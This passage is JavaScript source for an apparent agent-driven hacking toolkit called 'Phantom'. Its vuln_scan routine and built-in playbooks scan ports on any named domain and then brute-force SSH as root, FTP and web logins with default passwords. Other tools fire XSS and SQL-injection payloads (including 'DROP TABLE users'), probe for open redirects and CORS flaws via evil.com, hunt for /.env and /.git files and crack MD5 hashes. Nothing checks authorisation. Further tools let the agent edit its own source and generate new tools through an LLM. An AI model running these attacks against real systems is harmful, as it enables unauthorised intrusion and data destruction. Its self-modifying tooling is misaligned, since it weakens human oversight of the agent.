      const resolved = resolve(phantomDir, path.replace(/^\.\//, ""));
      if (!resolved.startsWith(phantomDir)) return `[Self Read] Access denied: path outside project`;
      if (!fs.existsSync(resolved)) return `[Self Read] Not found: ${path}`;
      const content = fs.readFileSync(resolved, "utf-8");
      if (content.length > 50000) return content.substring(0, 50000) + `\n... (truncated, ${content.length} chars total)`;
      return content;
    } catch (e) { return `[Self Read Error] ${e.message}`; }
  },

  self_edit: async (input) => {
    const parts = input.split("|");
    if (parts.length < 3) return "[Self Edit] Usage: relative_path|old_string|new_string";
    const [relPath, oldStr, ...rest] = parts;
    const newStr = rest.join("|");
    try {
      const phantomDir = resolve(import.meta.dirname || ".", ".");
      const resolved = resolve(phantomDir, relPath.replace(/^\.\//, ""));
      if (!resolved.startsWith(phantomDir)) return `[Self Edit] Access denied: path outside project`;
      if (!fs.existsSync(resolved)) return `[Self Edit] Not found: ${relPath}`;
      let content = fs.readFileSync(resolved, "utf-8");
      if (!content.includes(oldStr)) return `[Self Edit] String not found`;
      content = content.replace(oldStr, newStr);
      fs.writeFileSync(resolved, content, "utf-8");
      return `✅ Self-edited ${relPath}`;
    } catch (e) { return `[Self Edit Error] ${e.message}`; }
  },

  // ── VULN SCAN ──
  vuln_scan: async (target) => {
    const domain = target.replace(/^https?:\/\//, "").replace(/\/.*$/, "").trim();
    const ts = new Date().toISOString().replace(/[:.]/g, "-");
    const lines = [`# Phantom Vulnerability Scan Report`, `**Target:** ${domain}`, `**Date:** ${new Date().toUTCString()}`, `---`, ``];
    // Phase 1
    lines.push(`## Phase 1: Reconnaissance\n`);
    try { const r = await hackerTools.whois(domain); lines.push(`### WHOIS\n\`\`\`\n${r}\n\`\`\``); } catch {}
    try { const r = await hackerTools.dns_lookup(domain); lines.push(`### DNS\n\`\`\`\n${r}\n\`\`\``); } catch {}
    try { const r = await hackerTools.sub_enum(domain); lines.push(`### Subdomains\n\`\`\`\n${r}\n\`\`\``); } catch {}
    try { const r = await hackerTools.http_headers(`https://${domain}`); lines.push(`### HTTP Headers\n\`\`\`\n${r}\n\`\`\``); } catch {}
    try { const r = await hackerTools.ssl_check(domain); lines.push(`### SSL/TLS\n\`\`\`\n${r}\n\`\`\``); } catch {}
    const ports = await hackerTools.port_scan(domain);
    lines.push(`### Open Ports\n\`\`\`\n${ports}\n\`\`\``);
    // Phase 2
    lines.push(`\n## Phase 2: Vulnerability Search\n`);
    try { lines.push(`### CVEs\n\`\`\`\n${await hackerTools.cve_search(domain)}\n\`\`\``); } catch {}
    // Phase 3
    lines.push(`\n## Phase 3: Exploit Search\n`);
    try { lines.push(`### Exploits\n\`\`\`\n${await hackerTools.searchsploit(domain)}\n\`\`\``); } catch {}
    // Phase 4
    lines.push(`\n## Phase 4: Brute Force Testing\n`);
    const openPorts = [...ports.matchAll(/(\d+)\/tcp\s+open/gi)].map(m => parseInt(m[1]));
    if (openPorts.includes(22)) { lines.push(`- Port 22 (SSH) open`); try { lines.push(`  \`\`\`\n${await hackerTools.bruteforce(`ssh|${domain}|root|admin,root,toor,123456,password`)}\n\`\`\``); } catch {} }
    if (openPorts.includes(21)) { lines.push(`- Port 21 (FTP) open`); try { lines.push(`  \`\`\`\n${await hackerTools.bruteforce(`ftp|${domain}|admin|admin,password,ftp`)}\n\`\`\``); } catch {} }
    if (openPorts.some(p => [80, 443, 8080, 8443].includes(p))) { lines.push(`- Web server detected`); try { lines.push(`  \`\`\`\n${await hackerTools.bruteforce(`http|https://${domain}/login|admin|admin,password,admin123`)}\n\`\`\``); } catch {} }
    // Save
    if (!fs.existsSync(REPORTS_DIR)) fs.mkdirSync(REPORTS_DIR, { recursive: true });
    const reportPath = resolve(REPORTS_DIR, `vulnscan_${domain}_${ts}.md`);
    fs.writeFileSync(reportPath, lines.join("\n"), "utf-8");
    lines.push(`\n---\n📄 Full report: ${reportPath}`);
    return lines.join("\n");
  },

  report_save: async (input) => {
    const parts = input.split("|");
    const name = (parts[0] || `report_${Date.now()}`).replace(/[^a-z0-9_-]/gi, "_");
    const content = parts.slice(1).join("|") || input;
    if (!fs.existsSync(REPORTS_DIR)) fs.mkdirSync(REPORTS_DIR, { recursive: true });
    const fp = resolve(REPORTS_DIR, `${name}.md`);
    fs.writeFileSync(fp, content, "utf-8");
    return `📄 Report saved: ${fp}`;
  },

  session_save: async (name) => {
    const sessionsDir = resolve(BASE_DIR, "sessions");
    try {
      if (!fs.existsSync(sessionsDir)) fs.mkdirSync(sessionsDir, { recursive: true });
      const slug = name.replace(/[^a-z0-9_-]/gi, "_");
      const data = { name, created: new Date().toISOString(), tools: Object.keys(hackerTools).length };
      fs.writeFileSync(resolve(sessionsDir, `${slug}.json`), JSON.stringify(data, null, 2), "utf-8");
      return `✅ Session saved: ${slug}`;
    } catch (e) { return `[Session Error] ${e.message}`; }
  },

  session_load: async (name) => {
    const sessionsDir = resolve(BASE_DIR, "sessions");
    try {
      const slug = name.replace(/[^a-z0-9_-]/gi, "_");
      const fp = resolve(sessionsDir, `${slug}.json`);
      if (!fs.existsSync(fp)) return `[Session] Not found: ${name}`;
      const data = JSON.parse(fs.readFileSync(fp, "utf-8"));
      return `📂 Session: ${data.name}\nCreated: ${data.created}\nTools: ${data.tools}`;
    } catch (e) { return `[Session Error] ${e.message}`; }
  },

  code_gen: async (input) => {
    const parts = input.split("|");
    const [prompt, lang = "javascript", outPath = ""] = parts;
    const apiKey = process.env.OPENAI_API_KEY;
    if (!apiKey) {
      const stub = `// ${prompt}\n// Language: ${lang}\nfunction ${(prompt||"").replace(/[^a-z]/gi, "")}() {\n  // TODO\n}\n`;
      if (outPath) { fs.writeFileSync(resolve(outPath), stub, "utf-8"); return `✅ Stub written to ${outPath}`; }
      return stub;
    }
    try {
      const r = await fetch("https://api.openai.com/v1/chat/completions", {
        method: "POST", headers: { "Content-Type": "application/json", Authorization: `Bearer ${apiKey}` },
        body: JSON.stringify({ model: "gpt-4o-mini", messages: [{ role: "system", content: `Generate only ${lang} code. No explanations.` }, { role: "user", content: prompt }], max_tokens: 2000 }),
        signal: AbortSignal.timeout(30000),
      });
      const data = await r.json();
      const code = data?.choices?.[0]?.message?.content || "// Failed";
      if (outPath) { fs.writeFileSync(resolve(outPath), code, "utf-8"); return `✅ Generated ${code.length} chars → ${outPath}`; }
      return code;
    } catch (e) { return `[Code Gen Error] ${e.message}`; }
  },

  self_add_tool: async (prompt) => {
    const apiKey = process.env.OPENAI_API_KEY;
    if (!apiKey) return "[Self Add] Requires OPENAI_API_KEY";
    try {
      const r = await fetch("https://api.openai.com/v1/chat/completions", {
        method: "POST", headers: { "Content-Type": "application/json", Authorization: `Bearer ${apiKey}` },
        body: JSON.stringify({
          model: "gpt-4o-mini",
          messages: [{ role: "system", content: `Generate a Node.js async function taking a string input and returning Promise<string>. Name it after the tool purpose. No markdown.` }, { role: "user", content: `Tool that: ${prompt}` }],
          max_tokens: 1500,
        }),
        signal: AbortSignal.timeout(30000),
      });
      const data = await r.json();
      const result = data?.choices?.[0]?.message?.content || "// Failed";
      const toolName = result.match(/async function\s+(\w+)/)?.[1] || "newTool";
      const genDir = resolve(BASE_DIR, "generated");
      if (!fs.existsSync(genDir)) fs.mkdirSync(genDir, { recursive: true });
      fs.writeFileSync(resolve(genDir, `${toolName}.ts`), result, "utf-8");
      return `🎯 Generated tool "${toolName}" at ${genDir}/${toolName}.ts\nIntegrate: paste function into src/core/hacker-tools.ts, add to registry, run npm run build\n\n${result.substring(0, 600)}`;
    } catch (e) { return `[Self Add Error] ${e.message}`; }
  },

  // ── KNOWLEDGE BASE ──
  knowledge_add: async (input) => {
    try {
      const parts = input.split("|");
      const tags = (parts[0] || "general").split(",").map(t => t.trim()).filter(Boolean);
      const content = parts.slice(1).join("|").trim();
      if (!content) return "[Knowledge] Usage: tags|content";
      if (!fs.existsSync(KNOWLEDGE_DIR)) fs.mkdirSync(KNOWLEDGE_DIR, { recursive: true });
      const slug = tags[0].replace(/[^a-z0-9_-]/gi, "_") + "_" + Date.now();
      fs.writeFileSync(resolve(KNOWLEDGE_DIR, `${slug}.json`), JSON.stringify({ tags, content, created: new Date().toISOString() }, null, 2), "utf-8");
      return `📚 Knowledge saved (tags: ${tags.join(", ")})`;
    } catch (e) { return `[Knowledge Error] ${e.message}`; }
  },
  knowledge_search: async (input) => {
    try {
      if (!fs.existsSync(KNOWLEDGE_DIR)) return "[Knowledge] Empty";
      const q = input.toLowerCase().trim();
      const results = fs.readdirSync(KNOWLEDGE_DIR).filter(f => f.endsWith(".json")).map(f => {
        const d = JSON.parse(fs.readFileSync(resolve(KNOWLEDGE_DIR, f), "utf-8"));
        return !q || d.tags.some(t => t.toLowerCase().includes(q)) || d.content.toLowerCase().includes(q) ? `[${d.tags.join(", ")}] ${d.content.substring(0, 200)}` : null;
      }).filter(Boolean);
      return results.length ? `📚 Knowledge (${results.length}):\n${results.join("\n")}` : `[Knowledge] No results for "${q}"`;
    } catch (e) { return `[Knowledge Error] ${e.message}`; }
  },

  // ── PLAYBOOK SYSTEM ──
  playbook_list: async () => {
    try {
      if (!fs.existsSync(PLAYBOOKS_DIR)) fs.mkdirSync(PLAYBOOKS_DIR, { recursive: true });
      // Seed built-ins
      const BUILTINS = [
        { name:"quick_web_recon", description:"Full recon on a web target", variables:["target"], steps:[
          {tool:"whois",args:"{{target}}",desc:"WHOIS"},{tool:"dns_lookup",args:"{{target}}",desc:"DNS"},{tool:"sub_enum",args:"{{target}}",desc:"Subdomains"},{tool:"port_scan",args:"{{target}}",desc:"Ports"},{tool:"http_headers",args:"https://{{target}}",desc:"Headers"},{tool:"ssl_check",args:"{{target}}",desc:"SSL"}
        ]},
        { name:"vuln_assessment", description:"Full vuln assessment: recon + CVE + exploits", variables:["target"], steps:[
          {tool:"recon",args:"{{target}}",desc:"Recon sweep"},{tool:"cve_search",args:"{{target}}",desc:"CVEs"},{tool:"searchsploit",args:"{{target}}",desc:"Exploits"},{tool:"bruteforce",args:"ssh|{{target}}|root|admin,root,password",desc:"SSH brute"}
        ]},
        { name:"network_footprint", description:"Map network footprint: DNS, whois, geo, ports, crawl", variables:["target"], steps:[
          {tool:"dns_lookup",args:"{{target}}",desc:"DNS"},{tool:"whois",args:"{{target}}",desc:"WHOIS"},{tool:"port_scan",args:"{{target}}",desc:"Ports"},{tool:"crawl",args:"https://{{target}}",desc:"Crawl"}
        ]},
        { name:"full_vulnscan_report", description:"Auto vuln_scan + save report + session", variables:["target"], steps:[
          {tool:"vuln_scan",args:"{{target}}",desc:"Full scan"},{tool:"session_save",args:"scan_{{target}}",desc:"Save session"}
        ]},
      ];
      for (const pb of BUILTINS) {
        const fp = resolve(PLAYBOOKS_DIR, `${pb.name}.json`);
        if (!fs.existsSync(fp)) fs.writeFileSync(fp, JSON.stringify(pb, null, 2), "utf-8");
      }
      const files = fs.readdirSync(PLAYBOOKS_DIR).filter(f => f.endsWith(".json"));
      if (!files.length) return "[Playbook] No playbooks found";
      const lines = files.map(f => {
        const pb = JSON.parse(fs.readFileSync(resolve(PLAYBOOKS_DIR, f), "utf-8"));
        return `📋 ${pb.name} — ${(pb.description||"").substring(0, 80)} (${(pb.steps||[]).length} steps)`;
      });
      return `Available playbooks (${files.length}):\n${lines.join("\n")}`;
    } catch (e) { return `[Playbook Error] ${e.message}`; }
  },
  playbook_create: async (input) => {
    try {
      const parts = input.split("|");
      const name = (parts[0] || `pb_${Date.now()}`).replace(/[^a-z0-9_-]/gi, "_");
      const desc = parts[1] || "Auto-generated";
      const stepsRaw = parts.slice(2).join("|") || "";
      const apiKey = process.env.OPENAI_API_KEY;
      if (apiKey && !stepsRaw) {
        try {
          const r = await fetch("https://api.openai.com/v1/chat/completions", {
            method:"POST", headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`},
            body:JSON.stringify({model:"gpt-4o-mini",messages:[{role:"system",content:"Generate a JSON playbook. Format: {name,description,variables:[\"target\"],steps:[{tool,args,desc}]}. Only valid JSON."},{role:"user",content:`Create playbook: ${desc}`}],max_tokens:1000}),
            signal:AbortSignal.timeout(30000),
          });
          const d = await r.json();
          const pb = JSON.parse(d?.choices?.[0]?.message?.content || "{}");
          if (pb.steps) { pb.name = name; pb.description = desc; fs.writeFileSync(resolve(PLAYBOOKS_DIR, `${name}.json`), JSON.stringify(pb, null, 2), "utf-8"); return `✅ LLM-created playbook: ${name} (${pb.steps.length} steps)`; }
        } catch {}
      }
      const steps = stepsRaw ? stepsRaw.split(",").map(s => ({tool:"shell",args:s.trim(),desc:s.trim()})) : [{tool:"shell",args:"echo hello",desc:"Default step"}];
      fs.writeFileSync(resolve(PLAYBOOKS_DIR, `${name}.json`), JSON.stringify({name,description:desc,variables:["target"],steps}, null, 2), "utf-8");
      return `📋 Playbook created: ${name} (${steps.length} steps)`;
    } catch (e) { return `[Playbook Error] ${e.message}`; }
  },
  playbook_run: async (input) => {
    try {
      const parts = input.split("|");
      const name = parts[0]?.trim();
      if (!name) return "[Playbook] Usage: playbook_run|name|target=example.com";
      const fp = resolve(PLAYBOOKS_DIR, `${name.replace(/[^a-z0-9_-]/gi, "_")}.json`);
      if (!fs.existsSync(fp)) return `[Playbook] Not found: ${name}`;
      const pb = JSON.parse(fs.readFileSync(fp, "utf-8"));
      const vars = {};
      if (parts[1]) parts[1].split(",").forEach(p => { const [k,v] = p.split("="); if (k && v) vars[k.trim()] = v.trim(); });
      const log = [`Executing: ${pb.name}`, `Description: ${pb.description}`, `---`, ``];
      for (let i = 0; i < pb.steps.length; i++) {
        const s = pb.steps[i];
        let args = s.args;
        for (const [k, v] of Object.entries(vars)) args = args.replace(new RegExp(`\\{\\{${k}\\}\\}`, "g"), v);
        log.push(`Step ${i+1}/${pb.steps.length}: @${s.tool}|${args} — ${s.desc}`);
        try {
          if (!hackerTools[s.tool]) { log.push(`  ⚠ Unknown tool: ${s.tool}`); continue; }
          const r = await hackerTools[s.tool](args);
          log.push(`  ${r.substring(0, 1000)}`);
          if (r.length > 1000) log.push(`  … (${r.length} total)`);
        } catch (e) { log.push(`  ⚠ Error: ${e.message}`); }
        log.push(``);
      }
      log.push(`---\n✅ "${pb.name}" complete (${pb.steps.length} steps)`);
      return log.join("\n");
    } catch (e) { return `[Playbook Error] ${e.message}`; }
  },
  playbook_edit: async (input) => {
    try {
      const parts = input.split("|");
      const name = parts[0]?.trim();
      if (!name) return "[Playbook] Usage: playbook_edit|name|step|tool|args|desc";
      const fp = resolve(PLAYBOOKS_DIR, `${name.replace(/[^a-z0-9_-]/gi, "_")}.json`);
      if (!fs.existsSync(fp)) return `[Playbook] Not found: ${name}`;
      const pb = JSON.parse(fs.readFileSync(fp, "utf-8"));
      if (parts[1] === "desc" && parts[2]) { pb.description = parts[2]; fs.writeFileSync(fp, JSON.stringify(pb, null, 2), "utf-8"); return `✅ Description updated`; }
      if (parts[1] === "add" && parts[2]) { pb.steps.push({tool:parts[2],args:parts[3]||"",desc:parts[4]||parts[2]}); fs.writeFileSync(fp, JSON.stringify(pb, null, 2), "utf-8"); return `✅ Step added`; }
      const idx = parseInt(parts[1]) - 1;
      if (isNaN(idx) || idx < 0 || idx >= pb.steps.length) return `[Playbook] Invalid step. Steps: 1-${pb.steps.length}`;
      if (parts[2]) pb.steps[idx].tool = parts[2];
      if (parts[3]) pb.steps[idx].args = parts[3];
      if (parts[4]) pb.steps[idx].desc = parts[4];
      fs.writeFileSync(fp, JSON.stringify(pb, null, 2), "utf-8");
      return `✅ Step ${idx+1} updated: @${pb.steps[idx].tool}|${pb.steps[idx].args}`;
    } catch (e) { return `[Playbook Error] ${e.message}`; }
  },

  // ── RECON TOOLS ──
  geoip: async (ip) => {
    try {
      const r = await fetch(`http://ip-api.com/json/${ip.trim()}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,query`, {signal:AbortSignal.timeout(8000)});
      const d = await r.json();
      if (d.status === "fail") return `[GeoIP] ${d.message || "Unknown"}`;
      return `🌍 GeoIP: ${d.query}\nCountry: ${d.country}\nRegion: ${d.regionName}\nCity: ${d.city}\nZIP: ${d.zip}\nCoordinates: ${d.lat}, ${d.lon}\nISP: ${d.isp}\nOrg: ${d.org}\nASN: ${d.as}`;
    } catch (e) { return `[GeoIP Error] ${e.message}`; }
  },
  dns_zone: async (input) => {
    try {
      const domain = input.replace(/^https?:\/\//, "").replace(/\/.*$/, "").trim();
      const nsResp = await fetch(`https://dns.google/resolve?name=${domain}&type=NS`, {signal:AbortSignal.timeout(8000)});
      const nsData = await nsResp.json();
      const nsList = (nsData?.Answer||[]).map(a => a.data.replace(/\.$/, ""));
      if (!nsList.length) return "[DNS Zone] No NS records found";
      const results = [`Testing ${nsList.length} NS for zone transfer on ${domain}:`,``];
      for (const ns of nsList) {
        try {
          const r = await fetch(`https://dns.google/resolve?name=${domain}&type=AXFR&nameserver=${ns}`, {signal:AbortSignal.timeout(10000)});
          const d = await r.json();
          if (d?.Answer?.length > 0) { results.push(`⚠ VULNERABLE: ${ns} returned ${d.Answer.length} records!`); d.Answer.forEach(a => results.push(`  ${a.name} ${a.type} ${a.data}`)); }
          else results.push(`✅ ${ns} — zone transfer denied`);
        } catch { results.push(`⏰ ${ns} — timeout/error`); }
      }
      return results.join("\n");
    } catch (e) { return `[DNS Zone Error] ${e.message}`; }
  },
  http_methods: async (input) => {
    try {
      const url = input.startsWith("http") ? input : `https://${input}`;
      const methods = ["GET","POST","PUT","DELETE","OPTIONS","PATCH","HEAD","TRACE","CONNECT"];
      const results = [`Testing HTTP methods on ${url}:`,``];
      for (const method of methods) {
        try {
          const r = await fetch(url, {method, signal:AbortSignal.timeout(5000)});
          const allow = r.headers.get("allow") || r.headers.get("access-control-allow-methods") || "";
          results.push(`  ${method} → ${r.status}${allow ? ` (Allow: ${allow})` : ""}`);
        } catch (e) { results.push(`  ${method} → Error: ${(e.message||"").substring(0,60)}`); }
      }
      return results.join("\n");
    } catch (e) { return `[HTTP Methods Error] ${e.message}`; }
  },
  robots_txt: async (input) => {
    try {
      const base = input.startsWith("http") ? input : `https://${input}`;
      const url = `${base.replace(/\/+$/, "")}/robots.txt`;
      const r = await fetch(url, {signal:AbortSignal.timeout(8000)});
      if (r.status === 404) return `[robots.txt] Not found at ${url}`;
      const text = await r.text();
      const disallowed = text.match(/Disallow:\s*(.+)/gi) || [];
      const sitemaps = text.match(/Sitemap:\s*(.+)/gi) || [];
      return `🤖 robots.txt from ${url}:\n---\n${text.substring(0,2000)}${disallowed.length ? `\n\n🚫 Disallowed (${disallowed.length}):\n${disallowed.join("\n")}` : ""}${sitemaps.length ? `\n\n🗺 Sitemaps (${sitemaps.length}):\n${sitemaps.join("\n")}` : ""}`;
    } catch (e) { return `[robots.txt Error] ${e.message}`; }
  },
  email_verify: async (input) => {
    try {
      const email = input.trim().toLowerCase();
      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return `[Email] Invalid: ${email}`;
      const domain = email.split("@")[1];
      const r = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`, {signal:AbortSignal.timeout(8000)});
      const d = await r.json();
      const mxs = (d?.Answer||[]).filter(a => a.type === 15).map(a => a.data.replace(/\.$/, ""));
      return mxs.length ? `✅ ${email}\nDomain: ${domain}\nMX: ${mxs.join(", ")}` : `✅ Format valid, but no MX for ${domain}`;
    } catch (e) { return `[Email Error] ${e.message}`; }
  },

  reverse_dns: async (ip) => {
    try {
      const r = await fetch(`https://dns.google/resolve?name=${ip.trim()}&type=PTR`, {signal:AbortSignal.timeout(8000)});
      const d = await r.json();
      const ptrs = (d?.Answer||[]).filter(a => a.type === 12).map(a => a.data);
      return ptrs.length ? `🔁 PTR for ${ip}:\n${ptrs.join("\n")}` : `[Reverse DNS] No PTR for ${ip}`;
    } catch (e) { return `[Reverse DNS Error] ${e.message}`; }
  },
  wayback: async (input) => {
    try {
      const domain = input.replace(/^https?:\/\//, "").replace(/\/.*$/, "").trim();
      const r = await fetch(`https://web.archive.org/cdx/search/cdx?url=${domain}/*&output=json&limit=20&fl=timestamp,original,statuscode`, {signal:AbortSignal.timeout(15000)});
      const d = await r.json();
      if (!Array.isArray(d) || d.length < 2) return `[Wayback] No snapshots for ${domain}`;
      return `🗄 Wayback: ${domain} (${d.length - 1} snapshots)\n${d.slice(1).map(row => `  ${row[0].substring(0,8)} ${row[2]||"—"} ${row[1]}`).join("\n")}`;
    } catch (e) { return `[Wayback Error] ${e.message}`; }
  },
  cert_expiry: async (input) => {
    try {
      const domain = input.replace(/^https?:\/\//, "").replace(/\/.*$/, "").trim();
      const {execSync} = await import("child_process");
      const raw = execSync(`openssl s_client -connect ${domain}:443 -servername ${domain} </dev/null 2>/dev/null | openssl x509 -noout -dates`, {timeout:10000,encoding:"utf-8"});
      if (!raw.trim()) return `[Cert Expiry] No cert for ${domain}`;
      const nb = raw.match(/notBefore=(.+)/)?.[1] || "?";
      const na = raw.match(/notAfter=(.+)/)?.[1] || "?";
      const days = na !== "?" ? Math.round((new Date(na).getTime()-Date.now())/86400000) : NaN;
      return `🔒 ${domain}\nIssued: ${nb}\nExpires: ${na}${!isNaN(days)?`\nDays left: ${days}`:""}`;
    } catch (e) { return `[Cert Expiry Error] ${e.message}`; }
  },
  cors_test: async (input) => {
    try {
      const url = input.startsWith("http") ? input : `https://${input}`;
      const origins = ["https://evil.com","null","https://attacker.org","https://example.com",""];
      const r = [`🔓 CORS test: ${url}\n`];
      for (const origin of origins) {
        try {
          const resp = await fetch(url, {method:"GET", headers:origin?{Origin:origin}:{}, signal:AbortSignal.timeout(5000)});
          const acao = resp.headers.get("access-control-allow-origin") || "—";
          const creds = resp.headers.get("access-control-allow-credentials") || "";
          r.push(`  Origin: ${origin||"(none)"} → ACAO: ${acao}${creds?`, Credentials: ${creds}`:""}`);
        } catch (e) { r.push(`  Origin: ${origin} → ${(e.message||"").substring(0,50)}`); }
      }
      if (r.some(l => l.includes("*") || (l.includes("evil.com")&&l.includes("https://evil.com")))) r.push(`\n⚠ Vulnerable to CORS attacks!`);
      return r.join("\n");
    } catch (e) { return `[CORS Error] ${e.message}`; }
  },
  jwt_decode: async (input) => {
    try {
      const parts = input.trim().split(".");
      if (parts.length !== 3) return `[JWT] Expected 3 parts, got ${parts.length}`;
      const b64u = s => s.replace(/-/g,"+").replace(/_/g,"/");
      const decode = s => { try { return JSON.stringify(JSON.parse(Buffer.from(b64u(s),"base64").toString()),null,2); } catch { return Buffer.from(b64u(s),"base64").toString(); } };
      return `🔐 JWT\n── Header ──\n${decode(parts[0])}\n── Payload ──\n${decode(parts[1])}\n── Signature ──\n${parts[2].substring(0,40)}…`;
    } catch (e) { return `[JWT Error] ${e.message}`; }
  },
  hash_crack: async (input) => {
    try {
      const hash = input.trim();
      if (/^[a-f0-9]{32}$/i.test(hash)) {
        const r = await fetch(`https://www.nitrxgen.net/api/md5/${hash}`, {signal:AbortSignal.timeout(10000)});
        const text = await r.text();
        if (text?.trim()) return `🔓 MD5 cracked: ${hash} → ${text.trim()}`;
      }
      return `[Hash Crack] Not found: ${hash}. Supports MD5.`;
    } catch (e) { return `[Hash Crack Error] ${e.message}`; }
  },

  dir_bruteforce: async (input) => {
    try {
      const url = input.startsWith("http") ? input.replace(/\/+$/, "") : `https://${input.replace(/\/+$/, "")}`;
      const paths = ["/admin","/api","/.git","/.env","/backup","/wp-admin","/login","/config","/robots.txt","/.htaccess","/phpinfo.php","/test","/uploads","/debug","/graphql","/swagger","/api/v1","/health","/actuator","/console","/jenkins","/phpmyadmin","/cgi-bin","/server-status","/shell","/crossdomain.xml","/.well-known/security.txt","/metrics","/dump","/logs"];
      const results = (await Promise.allSettled(paths.map(async p => {
        try { const r = await fetch(url + p, {signal:AbortSignal.timeout(5000)}); if (r.status !== 404) return `  ${r.status} ${url}${p}`; } catch {}
        return null;
      }))).flatMap(r => r.status === "fulfilled" && r.value ? [r.value] : []);
      return results.length ? `🔍 Dir Bruteforce — ${results.length} hits on ${url}\n${results.join("\n")}` : `[DirBrute] No paths at ${url}`;
    } catch (e) { return `[DirBrute Error] ${e.message}`; }
  },
  xss_scan: async (input) => {
    try {
      const url = input.startsWith("http") ? input : `https://${input}`;
      const payloads = ["<script>alert(1)</script>", "\"><script>alert(1)</script>", "'\"><img src=x onerror=alert(1)>", "{{constructor.constructor('alert(1)')()}}", "'';!--\"<XSS>=&{()}"];
      const results = (await Promise.allSettled(payloads.map(async p => {
        try { const tu = (url.includes("?") ? url + "&" : url + "?") + "q=" + encodeURIComponent(p); const r = await fetch(tu, {signal:AbortSignal.timeout(5000)}); const t = await r.text(); if (t.includes(p.substring(0,15))) return `  ⚠ ${p.substring(0,25)} reflected`; } catch {}
        return null;
      }))).flatMap(r => r.status === "fulfilled" && r.value ? [r.value] : []);
      return results.length ? `🚨 XSS — ${results.length} reflection(s) on ${url}\n${results.join("\n")}` : `[XSS] No reflection at ${url}`;
    } catch (e) { return `[XSS Error] ${e.message}`; }
  },
  sql_detect: async (input) => {
    try {
      const url = input.startsWith("http") ? input : `https://${input}`;
      const payloads = ["' OR '1'='1", "' OR 1=1--", "' UNION SELECT 1--", "' AND 1=1--", "' AND SLEEP(3)--", "'; DROP TABLE users--", "' OR '1'='1' /*"];
      const results = (await Promise.allSettled(payloads.map(async p => {
        try { const tu = url.includes("?") ? url.replace(/([=?&])[^=&]+$/, "$1" + encodeURIComponent(p)) : url + "?id=" + encodeURIComponent(p); const r = await fetch(tu, {signal:AbortSignal.timeout(8000)}); const t = (await r.text().catch(() => "")).toLowerCase(); if (["sql","mysql","sqlite","syntax","unclosed","quotation","jdbc"].some(s => t.includes(s))) return `  ⚠ ${p.substring(0,20)} → SQL error`; } catch {}
        return null;
      }))).flatMap(r => r.status === "fulfilled" && r.value ? [r.value] : []);
      return results.length ? `⚠️ SQLi — ${results.length} injection(s) on ${url}\n${results.join("\n")}` : `[SQLi] No errors at ${url}`;
    } catch (e) { return `[SQLi Error] ${e.message}`; }
  },
  open_redirect: async (input) => {
    try {
      const url = input.startsWith("http") ? input : `https://${input}`;
      const params = ["url","redirect","redirect_uri","return","return_to","r","next","target","redir","dest","out","to","go","callback","ref"];
      const results = (await Promise.allSettled(params.map(async p => {
        try { const tu = (url.includes("?") ? url + "&" : url + "?") + p + "=https://evil.com"; const r = await fetch(tu, {redirect:"manual",signal:AbortSignal.timeout(5000)}); if ((r.headers.get("location")||"").includes("evil.com")) return `  ⚠ ${p}= → external redirect`; } catch {}
        return null;
      }))).flatMap(r => r.status === "fulfilled" && r.value ? [r.value] : []);
      return results.length ? `🔀 Redirect — ${results.length} open redirect(s)\n${results.join("\n")}` : `[OpenRedirect] None at ${url}`;
    } catch (e) { return `[OpenRedirect Error] ${e.message}`; }
  },
  shodan_search: async (input) => {
    const key = process.env.SHODAN_API_KEY;
    if (!key) return `[Shodan] Set SHODAN_API_KEY env var`;
    try {
      const r = await fetch(`https://api.shodan.io/shodan/host/search?key=${key}&query=${encodeURIComponent(input.trim())}&limit=10`, {signal:AbortSignal.timeout(15000)});
      const d = await r.json();
      if (!d.matches?.length) return `[Shodan] No results for "${input}"`;
      return `🌐 Shodan — ${d.total} result(s)\n${d.matches.slice(0,10).map(m => `  ${m.ip_str}:${m.port} ${m.transport||""} ${(m.product||m.data||"").substring(0,50)}`).join("\n")}`;
    } catch (e) { return `[Shodan Error] ${e.message}`; }
  },
  email_breach: async (input) => {
    try {
      const email = input.trim().toLowerCase();
      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return `[EmailBreach] Invalid email`;
      const key = process.env.HIBP_API_KEY;
      if (!key) return `[EmailBreach] Set HIBP_API_KEY env var`;
      const r = await fetch(`https://haveibeenpwned.com/api/v3/breachedaccount/${encodeURIComponent(email)}?truncateResponse=true`, {headers:{"hibp-api-key":key,"User-Agent":"Phantom"}, signal:AbortSignal.timeout(10000)});
      if (r.status === 404) return `🔒 ${email} — No known breaches ✅`;
      if (r.status === 200) { const b = await r.json(); return `⚠️ ${email} — ${b.length} breach(es)\n${b.slice(0,10).map(x => `  🔴 ${x.Name} (${x.BreachDate||"?"})`).join("\n")}`; }
      return `[EmailBreach] HTTP ${r.status}`;
    } catch (e) { return `[EmailBreach Error] ${e.message}`; }
  },
  github_dork: async (input) => {
    try {
      const r = await fetch(`https://api.github.com/search/code?q=${encodeURIComponent(input.trim())}&per_page=10`, {headers:{"Accept":"application/vnd.github.v3+json","User-Agent":"Phantom-Cyber"}, signal:AbortSignal.timeout(15000)});
      if (r.status === 403) return `[GitHubDork] Rate limited. Try again.`;
      const d = await r.json();
      if (!d.items?.length) return `[GitHubDork] No results for "${input}"`;
      return `🔍 GitHub Dork — ${d.total_count} result(s)\n${d.items.slice(0,10).map(i => `  📄 ${i.repository?.full_name||"?"}/${i.name}`).join("\n")}`;
    } catch (e) { return `[GitHubDork Error] ${e.message}`; }
  },
  sub_takeover: async (input) => {
    try {
      const domain = input.replace(/^https?:\/\//, "").replace(/\/.*$/, "").trim();
      const r = await fetch(`https://dns.google/resolve?name=${domain}&type=CNAME`, {signal:AbortSignal.timeout(8000)});
      const d = await r.json();
      const cnames = d?.Answer?.filter(a => a.type === 5).map(a => a.data) || [];
      if (!cnames.length) return `[SubTakeover] No CNAME for ${domain}`;
      const svcs = {"cloudfront.net":"AWS CloudFront","s3.amazonaws.com":"AWS S3","github.io":"GitHub Pages","herokuapp.com":"Heroku","azurewebsites.net":"Azure","trafficmanager.net":"Azure TM","pantheonsite.io":"Pantheon","squarespace.com":"Squarespace","zendesk.com":"Zendesk","freshdesk.com":"Freshdesk","helpscout.net":"Help Scout","readme.io":"ReadMe","unbounce.com":"Unbounce","statuspage.io":"Statuspage"};
